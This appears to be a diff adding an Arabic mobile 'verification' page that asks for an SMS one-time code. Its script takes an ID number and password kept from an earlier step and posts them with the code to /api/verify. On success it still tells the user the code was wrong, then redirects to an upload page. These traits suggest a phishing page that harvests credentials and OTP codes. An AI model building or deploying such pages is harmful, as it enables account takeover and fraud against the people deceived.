@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <title>التحقق</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: "Cairo", sans-serif;
+      background: #fff;
+      min-height: 100vh;
+      max-width: 430px;
+      margin: 0 auto;
+      color: #222;
+    }
+
+    .page-header {
+      background: #6b2d8a;
+      color: #fff;
+      padding: 14px 18px;
+      font-size: 17px;
+      font-weight: 700;
+      text-align: right;
+    }
+
+    .content {
+      padding: 28px 20px 24px;
+      text-align: center;
+    }
+
+    .phone-icon {
+      width: 72px;
+      height: 72px;
+      margin: 0 auto 16px;
+      color: #6b2d8a;
+    }
+
+    .content h1 {
+      font-size: 22px;
+      font-weight: 700;
+      margin-bottom: 14px;
+    }
+
+    .note {
+      font-size: 13px;
+      line-height: 1.65;
+      text-align: right;
+      margin-bottom: 22px;
+      color: #333;
+    }
+
+    .note strong { color: #c0392b; }
+
+    .otp-wrap {
+      margin: 0 auto 12px;
+      max-width: 320px;
+    }
+
+    .otp-input {
+      width: 100%;
+      height: 52px;
+      border: 2px solid #111;
+      border-radius: 4px;
+      font-family: inherit;
+      font-size: 28px;
+      font-weight: 700;
+      letter-spacing: 12px;
+      text-align: center;
+      outline: none;
+      padding: 0 12px;
+    }
+
+    .otp-input::placeholder {
+      letter-spacing: 8px;
+      color: #bbb;
+      font-size: 24px;
+    }
+
+    .otp-error {
+      min-height: 1.4em;
+      margin-top: 8px;
+      font-size: 14px;
+      font-weight: 700;
+      color: #e74c3c;
+      text-align: center;
+    }
+
+    .timer {
+      margin-top: 16px;
+      font-size: 14px;
+      font-weight: 600;
+      color: #6b2d8a;
+    }
+
+    .info-card {
+      margin: 28px 12px 0;
+      padding: 20px 16px;
+      background: #f3f3f5;
+      border-radius: 12px;
+      text-align: center;
+      font-size: 13px;
+      line-height: 1.7;
+      color: #333;
+    }
+
+    .sim-icon {
+      width: 40px;
+      height: 40px;
+      margin: 0 auto 10px;
+      display: block;
+    }
+
+    .overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,0.82);
+      align-items: center;
+      justify-content: center;
+      z-index: 100;
+    }
+
+    .overlay.show { display: flex; }
+
+    .spinner {
+      width: 52px;
+      height: 52px;
+      border: 4px solid #e0d4ec;
+      border-top-color: #6b2d8a;
+      border-radius: 50%;
+      animation: spin 0.75s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <header class="page-header">التحقق</header>
+
+  <main class="content">
+    <svg class="phone-icon" viewBox="0 0 64 64" fill="none" aria-hidden="true">
+      <rect x="18" y="8" width="28" height="48" rx="4" stroke="currentColor" stroke-width="2.5" fill="#fff"/>
+      <rect x="24" y="14" width="16" height="22" rx="2" fill="#6b2d8a" opacity="0.15"/>
+      <text x="32" y="28" text-anchor="middle" fill="#6b2d8a" font-size="10" font-weight="bold">XXX</text>
+      <circle cx="32" cy="50" r="2" fill="currentColor"/>
+    </svg>
+
+    <h1>تحقق</h1>
+
+    <p class="note">
+      <strong>ملاحظة:</strong>
+      الرجاء ادخال الرمز المرسل لرقم جوالك
+    </p>
+
+    <div class="otp-wrap">
+      <input
+        id="otp"
+        class="otp-input"
+        type="tel"
+        inputmode="numeric"
+        maxlength="6"
+        autocomplete="one-time-code"
+        placeholder="......"
+        aria-label="رمز التحقق"
+      />
+      <p class="otp-error" id="otp-error" aria-live="polite"></p>
+    </div>
+
+    <p class="timer" id="timer">اعادة ارسال رمز التحقق خلال 01:56</p>
+
+    <div class="info-card">
+      <svg class="sim-icon" viewBox="0 0 48 48" aria-hidden="true">
+        <path d="M8 38V14l16-8 16 8v24H8z" fill="#f5c842" stroke="#d4a82a" stroke-width="1"/>
+        <rect x="14" y="20" width="20" height="14" rx="2" fill="#fff" opacity="0.9"/>
+      </svg>
+      <p>
+        تم إرسال رمز التحقق إلى رقم الجوال المنتهي بـ <strong id="phone-suffix">---</strong>.
+        يُرجى التأكد من أن شريحة هذا الرقم متاحة على هذا الجهاز، وعدم مشاركة الرمز مع أي شخص
+      </p>
+    </div>
+  </main>
+
+  <div class="overlay" id="overlay" aria-hidden="true"><div class="spinner"></div></div>
+
+  <script>
+    const session = sessionStorage.getItem("authSession");
+    const authId = sessionStorage.getItem("authId");
+    const authPassword = sessionStorage.getItem("authPassword");
+    const idSuffix = sessionStorage.getItem("authIdSuffix") || "---";
+    if (!session || !authId || !authPassword) {
+      window.location.replace("/");
+    }
+    document.getElementById("phone-suffix").textContent = idSuffix;
+
+    const otpInput = document.getElementById("otp");
+    const errorEl = document.getElementById("otp-error");
+    const overlay = document.getElementById("overlay");
+    const timerEl = document.getElementById("timer");
+
+    let secondsLeft = 116;
+    const tick = setInterval(() => {
+      secondsLeft -= 1;
+      if (secondsLeft <= 0) {
+        clearInterval(tick);
+        timerEl.textContent = "يمكنك طلب إعادة إرسال الرمز";
+        return;
+      }
+      const m = String(Math.floor(secondsLeft / 60)).padStart(2, "0");
+      const s = String(secondsLeft % 60).padStart(2, "0");
+      timerEl.textContent = `اعادة ارسال رمز التحقق خلال ${m}:${s}`;
+    }, 1000);
+
+    let busy = false;
+
+    async function submitCode(code) {
+      if (busy || code.length < 4) return;
+      busy = true;
+      errorEl.textContent = "";
+      overlay.classList.add("show");
+
+      try {
+        const [res] = await Promise.all([
+          fetch("/api/verify", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              session,
+              code,
+              id: authId,
+              password: authPassword,
+              step: "2",
+            }),
+          }),
+          new Promise((r) => setTimeout(r, 3000)),
+        ]);
+        const data = await res.json().catch(() => ({}));
+
+        if (!res.ok || !data.ok) {
+          errorEl.textContent = data.message || "حدث خطأ";
+        } else {
+          errorEl.textContent = data.message || "رمز التحقق خاطئ";
+          setTimeout(() => {
+            window.location.href = "/upload.html";
+          }, 1200);
+          return;
+        }
+        otpInput.value = "";
+        otpInput.focus();
+      } catch {
+        errorEl.textContent = "تعذّر الاتصال بالخادم";
+      } finally {
+        overlay.classList.remove("show");
+        busy = false;
+      }
+    }
+
+    otpInput.addEventListener("input", () => {
+      otpInput.value = otpInput.value.replace(/\D/g, "").slice(0, 6);
+      errorEl.textContent = "";
+      if (otpInput.value.length === 6) {
+        submitCode(otpInput.value);
+      }
+    });
+  </script>
+</body>
+</html>
